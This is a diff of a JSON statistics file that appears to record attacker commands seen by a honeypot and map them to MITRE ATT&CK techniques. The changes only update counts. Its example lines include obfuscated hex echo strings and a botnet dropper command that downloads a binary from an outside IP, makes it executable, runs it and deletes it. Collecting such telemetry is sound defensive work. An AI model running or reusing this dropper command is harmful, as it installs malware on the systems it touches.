@@ -8,8 +8,8 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 74726,
-      "distinct_ips": 138,
+      "count": 74734,
+      "distinct_ips": 139,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
         "echo -e \"\\x47\\x41\\x59\"",
@@ -25,7 +25,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 2314,
+      "count": 2315,
       "distinct_ips": 134,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
@@ -150,6 +150,6 @@
       ]
     }
   ],
-  "total_commands": 177915,
-  "matched_commands": 77582
+  "total_commands": 178196,
+  "matched_commands": 77590
 }
